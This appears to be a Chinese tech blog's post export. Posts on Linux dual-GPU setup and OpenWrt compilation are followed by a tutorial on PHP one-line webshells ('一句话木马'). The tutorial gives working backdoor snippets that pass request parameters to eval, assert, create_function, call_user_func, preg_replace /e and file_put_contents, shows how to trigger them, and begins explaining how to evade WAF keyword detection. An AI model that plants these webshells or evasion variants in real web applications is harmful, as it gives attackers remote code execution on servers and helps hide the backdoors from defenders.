可选值：nvidia，intel，hybrid</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[intel]</span><br><span class="line"></span><br><span class="line">driver=modesetting</span><br><span class="line"><span class="comment"># 用于Intel GPU的驱动程序。可选值：modesetting , intel</span></span><br><span class="line"><span class="comment"># 要使用intel驱动程序，需要安装软件包 xf86-video-intel 。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">accel=</span><br><span class="line"><span class="comment"># 加速方法（对应于Xorg配置中的AccelMethod）。仅适用于intel驱动程序。</span></span><br><span class="line"><span class="comment"># 可选值：sna，xna，uxa</span></span><br><span class="line"><span class="comment"># 默认为空（未指定任何选项）</span></span><br><span class="line"></span><br><span class="line">tearfree=</span><br><span class="line"><span class="comment"># 在Xorg配置中启用TearFree选项。仅适用于intel驱动程序。</span></span><br><span class="line"><span class="comment"># 可能的值：是，否</span></span><br><span class="line"><span class="comment"># 默认为空（未指定任何选项）</span></span><br><span class="line"></span><br><span class="line">DRI=3</span><br><span class="line"><span class="comment"># DRI版本。可选值：2，3</span></span><br><span class="line"></span><br><span class="line">modeset=yes</span><br><span class="line"><span class="comment"># 是否为nouveau驱动程序启用模式设置。</span></span><br><span class="line"><span class="comment"># 不影响Intel GPU驱动程序的模式设置,仅在将nouveau用作切换后端时，此项才有意义。</span></span><br><span class="line"></span><br><span class="line">[nvidia]</span><br><span class="line"></span><br><span class="line">modeset=yes</span><br><span class="line"><span class="comment"># 是否启用模式设置。 PRIME同步所需（防止撕裂）。</span></span><br><span class="line"></span><br><span class="line">PAT=yes</span><br><span class="line"><span class="comment"># 是否在Nvidia驱动程序中启用NVreg_UsePageAttributeTable选项。</span></span><br><span class="line"><span class="comment"># 推荐，否则会导致CPU性能下降。</span></span><br><span class="line"></span><br><span class="line">DPI = 96</span><br><span class="line"><span class="comment"># DPI值。将传递给登录管理器的Xsetup脚本进行设置。</span></span><br><span class="line"><span class="comment"># 将运行命令 xrandr --dpi &lt;DPI&gt;</span></span><br><span class="line"><span class="comment"># 默认为空（上述命令将不运行）。</span></span><br><span class="line"></span><br><span class="line">ignore_abi=no</span><br><span class="line"><span class="comment"># 如果正在运行一个更新版本的xorg-server (假设启用PRIME 渲染卸载），由于ABI版本不匹配，可能无法加载nvidia驱动程序。将此项设置为 yes 将允许加载nvidia驱动程序。</span></span><br><span class="line"></span><br><span class="line">allow_external_gpus=no</span><br><span class="line"><span class="comment"># 如果要与外部Nvidia显卡一起使用optimus-manager，设置为yes（实验性）</span></span><br><span class="line"></span><br><span class="line">options=overclocking</span><br><span class="line"><span class="comment"># 以逗号分隔的Nvidia特定选项的列表。</span></span><br><span class="line"><span class="comment"># 可用选项：</span></span><br><span class="line"><span class="comment"># -overclocking：在Xorg配置中启用CoolBits，这将在Nvidia控制面板中解锁超频选项。注意：不适用于混合模式。</span></span><br><span class="line"><span class="comment"># -triple_buffer：启用三重缓冲。</span></span><br></pre></td></tr></table></figure>
<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p><strong>切换到nvidia</strong>: <code>optimus-manager --switch nvidia</code></p>
<p><strong>切换到Intel</strong>: <code>optimus-manager --switch intel</code></p>
<p><strong>设置开机使用intel</strong>: <code>optimus-manager --set-startup=intel</code></p>
<p><code>optimus-manager [参数]</code></p>
<p>可选参数：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">-h，--<span class="built_in">help</span> 			显示此帮助消息并退出</span><br><span class="line">-v，--version 		打印版本并退出</span><br><span class="line">--status 			打印optimus-manager的当前状态</span><br><span class="line">--print-mode 		打印当前桌面会话正在运行的GPU模式</span><br><span class="line">--print-next-mode 	打印下次登录会话时将使用的GPU模式</span><br><span class="line">--print-startup 	打印将在启动时使用的GPU模式</span><br><span class="line">--switch MODE 		将GPU模式设置为MODE。需要注销然后登录以应用更改。可选模式：intel，nvidia，hybrid，auto（自动检测您可能想要切换到的模式）</span><br><span class="line">--set-startup STARTUP_MODE 		将启动模式设置为STARTUP_MODE。可选模式：intel，nvidia，hybrid</span><br><span class="line">--temp-config  		PATH设置临时配置文件的路径，仅用于下次重新引导。对于测试电源开关配置而不会导致无法启动的安装很有用</span><br><span class="line">--no-confirm 		切换GPU时不要求确认并跳过所有警告</span><br><span class="line">--cleanup 			删除守护程序剩余的自动生成的配置文件</span><br></pre></td></tr></table></figure>
<p><strong>使用图形界面配置</strong>: <code>yay -S optimus-manager-qt</code></p>
<p><a href="https://github.com/Shatur95/optimus-manager-qt"><code>optimus-manager-qt</code></a></p>
<p>Gnome shell插件:</p>
<p><a href="https://github.com/inzar98/optimus-manager-argos"><code>optimus-manager-argos</code></a></p>
<p><a href="https://github.com/andr3slelouch/Optimus-Manager-Indicator"><code>Optimus-Manager-Indicator</code></a></p>
<h1 id="Manjaro双显卡"><a href="#Manjaro双显卡" class="headerlink" title="Manjaro双显卡"></a>Manjaro双显卡</h1><p>Manjaro官方提供一个驱动驱动管理工具<code>mhwd</code>,可用于直接安装相关驱动</p>
<p><code>mhwd [指令]</code></p>
<div class="table-container">
<table>
<thead>
<tr>
<th>指令</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>--pci</code></td>
<td>仅列出PCI设备和驱动程序配置</td>
</tr>
<tr>
<td><code>--usb</code></td>
<td>仅列出USB设备和驱动程序配置</td>
</tr>
<tr>
<td><code>-h/--help</code></td>
<td>显示帮助</td>
</tr>
<tr>
<td><code>-v/--version</code></td>
<td>显示mhwd的版本</td>
</tr>
<tr>
<td><code>-f/--force</code></td>
<td>强制重新安装</td>
</tr>
<tr>
<td><code>-d/--detail</code></td>
<td>显示-l / -li / -lh的详细信息</td>
</tr>
<tr>
<td><code>-l/--list</code></td>
<td>列出设备的可用配置</td>
</tr>
<tr>
<td><code>-la/--listall</code></td>
<td>列出所有驱动程序配置</td>
</tr>
<tr>
<td><code>-li/--listinstalled</code></td>
<td>列出已安装的驱动程序配置</td>
</tr>
<tr>
<td><code>-lh/--listhardware</code></td>
<td>列出硬件信息</td>
</tr>
<tr>
<td><code>-i/--install &lt;usb/pci&gt; &lt;config(s)&gt;</code></td>
<td>安装驱动程序配置</td>
</tr>
<tr>
<td><code>-ic/--installcustom &lt;usb/pci&gt; &lt;path&gt;</code></td>
<td>安装自定义配置</td>
</tr>
<tr>
<td><code>-r/--remove &lt;usb/pci&gt; &lt;config(s)&gt;</code></td>
<td>删除驱动程序配置</td>
</tr>
<tr>
<td><code>-a/--auto &lt;usb/pci&gt; &lt;free/nonfre&gt; &lt;classid&gt;</code></td>
<td>自动安装classid的配置</td>
</tr>
<tr>
<td><code>--pmcachedir &lt;path&gt;</code></td>
<td>设置程序包管理器缓存路径</td>
</tr>
<tr>
<td><code>--pmconfig &lt;path&gt;</code></td>
<td>设置程序包管理器配置</td>
</tr>
<tr>
<td><code>--pmroot &lt;path&gt;</code></td>
<td>设置软件包管理器root</td>
</tr>
</tbody>
</table>
</div>
<p><strong>安装闭源驱动</strong></p>
<p>nvidia : <code>sudo mhwd -f -i pci video-hybrid-intel-nvidia-prime</code><br>nvidia-390xx : <code>sudo mhwd -f -i pci video-hybrid-intel-nvidia-390xx-bumblebee</code></p>
<h2 id="使用默认的bumblee管理显卡"><a href="#使用默认的bumblee管理显卡" class="headerlink" title="使用默认的bumblee管理显卡"></a>使用默认的bumblee管理显卡</h2><p><strong>将用户加入到bumblee组</strong>: <code>sudo gpasswd -a $USER bumblebee</code></p>
<p><strong>设置bumblebeed开机启动</strong>: <code>sudo systemctl enable bumblebeed</code></p>
<p><strong>重启</strong></p>
<h3 id="修复无法进入桌面"><a href="#修复无法进入桌面" class="headerlink" title="修复无法进入桌面"></a>修复无法进入桌面</h3><p>若重启无法进入桌面，在开机后黑屏的地方按 <code>Ctrl+Alt+F3</code> 即可进入 <code>tty</code> ，在终端中进行相关配置</p>
<p>查询BusID</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">lspci | grep -E <span class="string">&quot;VGA|3D&quot;</span></span><br><span class="line"></span><br><span class="line">00:02.0 VGA compatible controller: Intel Corporation HD Graphics 620 (rev 02)</span><br><span class="line">01:00.0 3D controller: NVIDIA Corporation GM108M [GeForce 940MX] (rev a2)</span><br></pre></td></tr></table></figure>
<p>nvidia的BusID为: <code>PCI:1:0:0</code></p>
<p>将 <code>/etc/X11/xorg.conf.d/90-mhwd.conf</code> 备份然后修改为如下配置</p>
<figure class="highlight sh"><figcaption><span>/etc/X11/xorg.conf.d/90-mhwd.conf</span></figcaption><table><tr><td class="code"><pre><span class="line">Section <span class="string">&quot;Module&quot;</span></span><br><span class="line">    Load <span class="string">&quot;modesetting&quot;</span></span><br><span class="line">EndSection</span><br><span class="line"></span><br><span class="line">Section <span class="string">&quot;Device&quot;</span></span><br><span class="line">    Identifier <span class="string">&quot;nvidia&quot;</span></span><br><span class="line">    Driver <span class="string">&quot;nvidia&quot;</span></span><br><span class="line">    BusID <span class="string">&quot;PCI:1:0:0&quot;</span></span><br><span class="line">    Option <span class="string">&quot;AllowEmptyInitialConfiguration&quot;</span></span><br><span class="line">EndSection</span><br></pre></td></tr></table></figure>
<p>重启</p>
<h3 id="测试性能"><a href="#测试性能" class="headerlink" title="测试性能"></a>测试性能</h3><p>安装性能测试工具: <code>sudo pacman -S mesa-demos glmark2</code></p>
<p><strong>测试集显性能</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">glxgears</span><br><span class="line">glmark2</span><br></pre></td></tr></table></figure>
<p><strong>测试独显性能</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">optirun glxgears</span><br><span class="line">optirun glmark2</span><br></pre></td></tr></table></figure>
<p><code>NVIDIA setting</code>面板打不开使用命令 : <code>optirun -b none nvidia-settings -c :8</code></p>
<h2 id="使用optimus-manager管理"><a href="#使用optimus-manager管理" class="headerlink" title="使用optimus-manager管理"></a>使用optimus-manager管理</h2><p><strong>关闭bumblebeed</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo systemctl stop bumblebeed</span><br><span class="line">sudo systemctl <span class="built_in">disable</span> bumblebeed</span><br></pre></td></tr></table></figure>
<p>安装 <code>optimus-manager</code> 然后启动服务</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo pacman -S optimus-manager</span><br><span class="line">sudo systemctl <span class="built_in">enable</span> optimus-manager</span><br></pre></td></tr></table></figure>
<p>根据上文内容配置 <code>optimus-manager</code> 然后重启即可。</p>
<h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><p>很多硬件厂商的BIOS驱动对Linux不友好，无法顺利加载ACPI模块，从而导致无法驱动独立显卡，这就需要修改grub启动文件使ACPI模块能正常工作</p>
<p>修改 <code>/etc/default/grub</code></p>
<figure class="highlight sh"><figcaption><span>/etc/default/grub</span></figcaption><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 在 GRUB_CMDLINE_LINUX_DEFAULT=&quot;quiet resume=UUID=2d6d6716-4886-49ff-a277-55ba5d9f19d8&quot; 中加入 acpi_osi=’Windows 2009’ 或者 acpi_osi=Linux acpi_osi=’Windows 2015’ pcie_port_pm=off</span></span><br><span class="line"><span class="comment"># acpi_osi=’Windows 2009’的意思是告诉ACPI模块，我是‘Windows 7’，模拟Windows让其继续运行</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 如：</span></span><br><span class="line">GRUB_CMDLINE_LINUX_DEFAULT=<span class="string">&quot;quiet acpi_osi=’Windows 2009’ resume=UUID=2d6d6716-4886-49ff-a277-55ba5d9f19d8&quot;</span></span><br></pre></td></tr></table></figure>
<p><strong>更新grub文件使生效</strong>: <code>sudo update-grub</code></p>
<p><strong>重启</strong></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://wiki.archlinux.org/index.php/NVIDIA">NVIDIA ArchWiki</a></p>
<p><a href="https://github.com/Askannz/optimus-manager/blob/master/README.md">optimus-manager README</a></p>
<p><a href="https://blog.csdn.net/baidu_33340703/article/details/103977592">(已解决)Manjaro安装英伟达NVIDIA闭源驱动后无法进入桌面</a></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Arch</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>OpenWrt插件</title>
    <url>/posts/d0352c7e/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">您好, 这里需要密码.</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="18401b52c983bfacb1ad6aa0b2976ff778317573fc53c99af7a3449c5a4fc522">09b153ef4c848791b2c131c622d5338173ba1828442df228ccffeaa3acaa29494426be78ca82c7b9af5143c4ab0d2bd4fa32e8a13294652ff68d49bc1cd45bd263fd0704f7667275b8555edc4216a0eec573e5a7decf7fe3459130c11c8084613fd3562645f60ece1b689202dcd9f243962ae8c04908602f946b87fb83c9da83ea7d74ae8f016a2dbec36b00f3102f10df966c28f52500431590797fe7fca56ae23697c822582d0fa30443ef1c291298f3ac4bf4f236e87adfb996d905e4b932136cdad9e88c5a9a95e03de2e4263ae49bb9f7869db4cd1c621fb9d32dfc16870504a3f531b72025128d8bc0fa055593ab67eec19cafca510a799423dbc42ede1006926d0cfe835db955ef389eaabadd676ca0910ae689a5385ae3fd472503271eb71d82e28e7d512b1b605981ca13fdd6a8e2b4c876d1e62ee6c7638db53c3e233fb1db7f22d0ea01d0667319e88ddf339dfe4cf986ac1293892f11c440d15c1cade187548bfd6af1286ae65c9cfe4a2b21c033e901768788447ec2d4c5280d9fd38a4bb86654ac0148665bb34653e97e0e9a01367c2379953f2a42c2e5a26648d229f4845ba472f229ff2f7f41fc3b6c2341ffcc32b5eedf913cfee42414930b4f3fd634d8e51aba41a091d9c3df16aa3152f370483df4605b9ec8797eff4491291ac3f09bc5cb19a51956d63b3a09c3d4233b49b450ef6a6cc801521d1af9cf1e67b66f96beb188bb2fc127ab14dbec73f9347cbbcdf863c59e52646088dd0d2db10836fef3585e70b2700464b21f13eaf3f3e4594740ea24046b9525a5fee2dc8e5cc66d1914dad9a09e762ba6106e678bc577c9a55c06042ecb16171bbdd9dabc2ceaa76d316ecf87a5dab97776adb72df1ea0a7b9bdaf06b38d9a513075d44b01dabda9cd2cb0d44881f2b8ffb178d0d9aa20a485094f8aab940ca2115d153bacfdb6c96d3f842bc81fa88de6d910046590e1765269cdcf6b368bff3f3523ba0b08b27ace837c50b6c85f19a231f9f397f67f158bc0829d7fe2f87fafec4418eb2f012ad9da3c18ad79e479489ac16b88e66804799a700475b798497d5682ff75d6dc7a64bcb85f736a587ab92ca337e1d7f33f07c0887ade07dd4fba39fc49a013e287fade509b6e7eb415678bfcf0ddbc8dc6e140689b7698003015fdf021280beded5567cdd00c6ec575d56a6faffdccd7f38c35b1b6a1a050ae0f2d19ca37e0f04629d26f74dde297729156ec9d5892a87679aea91be7a42977c22235181de365f514cb50f189cf233311782568a637502aff55343b30fc60e8853aa219b4424491766d87eb244be322eab9edd9800f538b6f95099dbfe4c40e9cb1f76040b5d03a2d8140e85ee95176178e2b70f17302a5e242d90d6cdf5c1f38f93aaa83f991edb8a1a8c9290987eb27ab30184102db9544e2724afc63ef66175dbe38f25b108f0662c19b69b7be7c7d7ee1e3b154790cfd5083e96956af4d25fe0cab76be9d82550cad202b199f02e909698ac607264d5c9d8a1fb124350ea666125557c02f97bff8e0344fb7e26ffd60fc5cf8178a70ac55f7b19cec6ad44e2b230877f9943f05e2d58b7a95ba3167931cee669d24e338bb9bb33d53dd3d755d9c81386378ac15700bbc058270f2e0b220ae994234ec6dbe8c8f9f768e98491da39d49960b6ab8d46a2b8c809aa65bc9a1907ace4565be81a0ecf95cd8cbe23c789652d02777f59e3e6cb79892e006469f8f8dbf3525cabf7c4cdf60ccc49a1c31aa551c2b6b813e25ebc49589c42c772eb053aa01c244e734879ed41b7560411954e7eb9bd476892ec43deb24972bbceb465599b917d163b2e077ccc4db48a06d8add834b590770d2a62b42f770dae0f95560d2fa8374290b9e128bca062148829f42f4f088080754e2d58fe7867527853469fcc795f55ff3db7fb73f3e354bd7de8a064d937f42c130c06492da0428e4a33659aa62d31e37cb1e8cbae4a1320a72640de38da6589e00df528b08175e4c20b28b25b5546d7f149888465ace31787839d779403c7bfc25c659654b6d45769aa04aa90c790f709e43436074ec7fb024fde4beb277695957e49ad2c78cff9eaa315ebffadd3fc71b3cafcb10a7f64d3a63adc00926fcd8cb286fb1775018d864f6fa3694f00d3a6f0ecd67bd774</script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>OpenWrt</tag>
      </tags>
  </entry>
  <entry>
    <title>OpenWrt编译</title>
    <url>/posts/f0343180/</url>
    <content><![CDATA[<h1 id="OpenWrt"><a href="#OpenWrt" class="headerlink" title="OpenWrt"></a>OpenWrt</h1><p><a href="https://zh.wikipedia.org/wiki/OpenWrt">OpenWrt WiKi</a></p>
<p><a href="https://openwrt.org/zh/start">OpenWrt 官网</a></p>
<p><a href="https://zh.wikipedia.org/wiki/LEDE">LEDE WiKi</a></p>
<a id="more"></a>
<h1 id="编译准备"><a href="#编译准备" class="headerlink" title="编译准备"></a>编译准备</h1><p><strong>国内请尽量全局科学上网</strong></p>
<h2 id="安装工具依赖"><a href="#安装工具依赖" class="headerlink" title="安装工具依赖"></a>安装工具依赖</h2><p>需要以下工具来编译OpenWrt，软件包名称在发行版之间有所不同。 <strong>在<a href="https://openwrt.org/docs/guide-developer/build-system/install-buildsystem">Build system setup</a>中找到不同发行版上软件包的列表。</strong></p>
<ul>
<li><code>binutils</code></li>
<li><code>bzip2</code></li>
<li><code>diff</code></li>
<li><code>find</code></li>
<li><code>flex</code></li>
<li><code>gawk</code></li>
<li><code>gcc-6+</code></li>
<li><code>getopt</code></li>
<li><code>grep</code></li>
<li><code>libc-dev</code></li>
<li><code>libz-dev</code></li>
<li><code>make4.1+</code></li>
<li><code>perl</code></li>
<li><code>python3.6+</code></li>
<li><code>rsync</code></li>
<li><code>subversion</code></li>
<li><code>unzip</code></li>
<li><code>which</code></li>
</ul>
<h2 id="获取源码"><a href="#获取源码" class="headerlink" title="获取源码"></a>获取源码</h2><p><strong>原生 OpenWrt:</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/openwrt/openwrt.git</span><br></pre></td></tr></table></figure>
<p><strong>lean OpenWrt(LEDE):</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/coolsnowwolf/lede.git</span><br></pre></td></tr></table></figure>
<h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><p>运行 <a href="https://oldwiki.archive.openwrt.org/doc/devel/feeds">feeds</a> 获取所有的预定义软件包并且安装</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">./scripts/feeds update -a</span><br><span class="line">./scripts/feeds install -a</span><br></pre></td></tr></table></figure>
<p>配置编译，详细参考下一节</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">make menuconfig</span><br></pre></td></tr></table></figure>
<p>下载 dl 库（国内请尽量全局科学上网）</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">make -j8 download V=s</span><br></pre></td></tr></table></figure>
<p>开始编译<br><code>-j1</code> 是线程数。第一次编译推荐用单线程</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">make -j1 V=s</span><br></pre></td></tr></table></figure>
<p><strong>编译完成后输出路径：</strong> <code>bin/targets</code> </p>
<p>二次编译(更新)</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> lede</span><br><span class="line">git pull</span><br><span class="line">./scripts/feeds update -a &amp;&amp; ./scripts/feeds install -a</span><br><span class="line">make defconfig</span><br><span class="line">make -j8 download</span><br><span class="line">make -j$(($(nproc) + <span class="number">1</span>)) V=s</span><br></pre></td></tr></table></figure>
<p>若需要重新配置</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">rm -rf ./tmp &amp;&amp; rm -rf .config</span><br><span class="line">make menuconfig</span><br><span class="line">make -j$(($(nproc) + <span class="number">1</span>)) V=s</span><br></pre></td></tr></table></figure>
<h2 id="配置参考"><a href="#配置参考" class="headerlink" title="配置参考"></a>配置参考</h2><p><strong>方向建上下操作纵列，左右操作横列，空格选择，回车进入子菜单，<code>*</code> 代表编入固件，<code>M</code> 表示编译成模块或者IPK包， <code>空</code> 不编译</strong></p>
<p><code>Target System</code> : 系统架构,例: <code>MediaTek Ralink MIPS</code><br><code>Subtarget</code> : 处理器型号,例: <code>MT7621 based boards</code><br><code>Target Profile</code> : 路由器型号,例: <code>Xiaomi Mi Router AC2100</code></p>
<p><code>LuCI  ---&gt; 3. Applications  ---&gt;</code> : <code>插件</code><br><code>LuCI  ---&gt; 4. Themes  ---&gt;</code> : <code>主题</code>,例: <code>&lt;*&gt; luci-theme-argon</code></p>
<p><strong>配置好后使用左右键选中 <code>&lt; Save &gt;</code> 回车将配置保存到 <code>.config</code> 中，使用 <code>ESC</code> 键退出 </strong></p>
<h1 id="自选插件"><a href="#自选插件" class="headerlink" title="自选插件"></a>自选插件</h1><h2 id="插件列表"><a href="#插件列表" class="headerlink" title="插件列表"></a>插件列表</h2><p><a href="https://www.right.com.cn/forum/thread-3682029-1-1.html">OpenWrt 编译 LuCI -&gt; Applications 添加插件应用说明</a></p>
<h2 id="添加源码库中未包含的插件"><a href="#添加源码库中未包含的插件" class="headerlink" title="添加源码库中未包含的插件"></a>添加源码库中未包含的插件</h2><h3 id="使用插件集合库"><a href="#使用插件集合库" class="headerlink" title="使用插件集合库"></a>使用插件集合库</h3><ul>
<li><a href="https://github.com/kenzok8/openwrt-packages">kenzok8/openwrt-packages</a></li>
<li><a href="https://github.com/liuran001/openwrt-packages">liuran001/openwrt-packages</a></li>
</ul>
<p>在文件 <code>feeds.conf.default</code> 中添加：</p>
<figure class="highlight sh"><figcaption><span>feeds.conf.default</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="comment"># kenzok8仓库</span></span><br><span class="line">src-git kenzo https://github.com/kenzok8/openwrt-packages</span><br><span class="line"><span class="comment"># kenzok8的需要安装依赖</span></span><br><span class="line">src-git small https://github.com/kenzok8/small</span><br><span class="line"></span><br><span class="line"><span class="comment"># liuran001仓库</span></span><br><span class="line">src-git liuran001_packages https://github.com/liuran001/openwrt-packages</span><br></pre></td></tr></table></figure>
<p>执行命令获取并安装</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">./scripts/feeds update -a &amp;&amp; ./scripts/feeds install -a</span><br></pre></td></tr></table></figure>
<h3 id="单独添加需要的插件"><a href="#单独添加需要的插件" class="headerlink" title="单独添加需要的插件"></a>单独添加需要的插件</h3><p>在 github 搜索 <code>luci-app</code> 找到需要的插件,如：<a href="https://github.com/rufengsuixing/luci-app-adguardhome">rufengsuixing/luci-app-adguardhome</a> 。</p>
<p>将插件源码 <code>clone</code> 到 <code>package</code> 下新建的一个目录中，然后在配置中勾选编译，也可使用插件作者编译完成的在路由器管理界面进行安装，也可通过 ssh 使用 <code>opkg install xxxx</code> 安装，使用 <code>opkg remove xxxx</code> 卸载。</p>
<h1 id="Github-Action自动编译"><a href="#Github-Action自动编译" class="headerlink" title="Github Action自动编译"></a>Github Action自动编译</h1><p>借助 GitHub Actions 的 OpenWrt 在线集成自动编译，可以不要求自己的硬件或系统达到要求即可进行编译。</p>
<p><a href="https://github.com/P3TERX/Actions-OpenWrt">P3TERX/Actions-OpenWrt</a></p>
<p><a href="https://github.com/KFERMercer/OpenWrt-CI">KFERMercer/OpenWrt-CI</a></p>
<h1 id="编译前自定义IP"><a href="#编译前自定义IP" class="headerlink" title="编译前自定义IP"></a>编译前自定义IP</h1><p>修改 <code>package/base-files/files/bin/config_generate</code> 中的 <code>192.168.1.1</code> 的后两位即可</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>OpenWrt</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP一句话</title>
    <url>/posts/77b49f04/</url>
    <content><![CDATA[<h1 id="一句话木马原理"><a href="#一句话木马原理" class="headerlink" title="一句话木马原理"></a>一句话木马原理</h1><p><code>&lt;?php @eval($_POST[&#39;hack&#39;]);?&gt;</code> 是一句话后面中最经典的一种，，其原理是：通过 <code>POST</code> 、<code>GET</code> 、<code>COOKIE</code> 三种方式获取参数 <code>hack</code> 的值，通过 <code>eval()</code> 函数执行 <code>hack</code> 中的PHP代码，这样就能通过一句话木马在网站执行传递过去的任意PHP语句。</p>
<p>经典一句话木马大多只有两个部分：可执行函数部分和接收数据部分</p>
<a id="more"></a>
<h2 id="例"><a href="#例" class="headerlink" title="例"></a>例</h2><figure class="highlight php"><figcaption><span>http://test.local/post.php</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>http://test.local/post.php</code> &gt;&gt; 浏览器插件 <code>HackBar</code> &gt;&gt; <code>Enable POST</code> &gt;&gt; <code>a=phpinfo();</code> </p>
<figure class="highlight php"><figcaption><span>http://test.loacl/get.php</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>http://test.local/get.php?test=phpinfo();</code></p>
<h1 id="其他函数"><a href="#其他函数" class="headerlink" title="其他函数"></a>其他函数</h1><h2 id="assert"><a href="#assert" class="headerlink" title="assert"></a><code>assert</code></h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @assert(<span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="create-function"><a href="#create-function" class="headerlink" title="create_function"></a><code>create_function</code></h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$fun</span> = @create_function(<span class="string">&#x27;&#x27;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>]);</span><br><span class="line">@<span class="variable">$fun</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="call-user-func-回调函数"><a href="#call-user-func-回调函数" class="headerlink" title="call_user_func 回调函数"></a><code>call_user_func</code> 回调函数</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @call_user_func(assert,<span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>call_user_func</code> 函数的第一个参数调用其他函数，第二个参数为该调用函数传参。一些被waf拦截的的可配合这个函数绕过waf。</p>
<h2 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace"></a><code>preg_replace</code></h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@preg_replace(<span class="string">&quot;/abcde/e&quot;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>],<span class="string">&quot;abcdefg&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>该函数利作用是使用正则表达式替换符合条件的字符串，但该函数可执行命令。函数的第一个参数是正则表达式，按照 PHP 的格式，表达式在<code>/</code>间，若在<code>/</code>末尾加 <code>e</code>，这个函数的第二个参数就会被当作代码执行。</p>
<h2 id="file-put-contents"><a href="#file-put-contents" class="headerlink" title="file_put_contents"></a><code>file_put_contents</code></h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$test</span>=<span class="meta">&lt;?php</span> <span class="variable">$a</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>];assert(<span class="variable">$a</span>)<span class="meta">?&gt;</span>;</span><br><span class="line">@file_put_contents(<span class="string">&quot;Biu.php,<span class="subst">$test</span>&quot;</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>利用函数生成木马文件，第一个参数是文件名，第二个参数是文件内容</p>
<h1 id="一句话木马绕过waf"><a href="#一句话木马绕过waf" class="headerlink" title="一句话木马绕过waf"></a>一句话木马绕过waf</h1><p>WAF （Web 应用防火墙）用于保护 Web 应用不被各类应用层攻击,如跨站脚本(XSS)、SQL注入、cookie中毒等，通常以关键字判断是否为一句话木马。</p>
<p><strong>本节仅是绕过一些基础的关键字查杀 WAF，更多免杀请产考：</strong><a href="https://xz.aliyun.com/t/9246">免杀/一句话木马(PHP)</a></p>
<h2 id="变量函数"><a href="#变量函数" class="headerlink" title="变量函数"></a>变量函数</h2><p><strong>变量函数(可变函数)</strong> : 变量名后有圆括号，PHP将寻找与变量的值同名的函数，并尝试执行。<strong>即使用变量作为函数名的函数</strong></p>
<p><strong>注意: eval是一个语言构造器而不是一个函数，不能被变量函数调用。</strong></p>
